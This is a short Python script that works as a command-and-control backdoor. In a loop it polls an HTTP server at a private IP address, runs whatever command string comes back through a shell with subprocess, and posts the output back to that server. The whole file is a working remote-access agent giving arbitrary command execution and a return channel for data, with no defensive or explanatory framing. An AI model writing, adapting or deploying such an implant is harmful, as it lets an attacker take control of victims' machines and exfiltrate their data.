import requests
import subprocess
import time

commandCheck = [None] * 2
while True:
    urltosearch = 'http://192.168.0.10:8080/toto'

    req = requests.get(urltosearch)
    command = req.text
    print(command)

    if command == "{TextCommand:}!":
        time.sleep(3)
        continue

    command2 = command.split("||")
    print(command2)

    print("commandcheck "+str(commandCheck[0]))
    print("command "+command)
    if command != str(commandCheck[0]):
        commandCheck[0] = command
        print("commandcheck2 "+str(commandCheck[0]))
        command = command2[1]

        if 'terminate' in command:
            continue

        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

            result  = CMD.stdout.read()
            post_response = requests.post(urltosearch, {command:result})

    else:
        time.sleep(3)
        continue


    time.sleep(3)
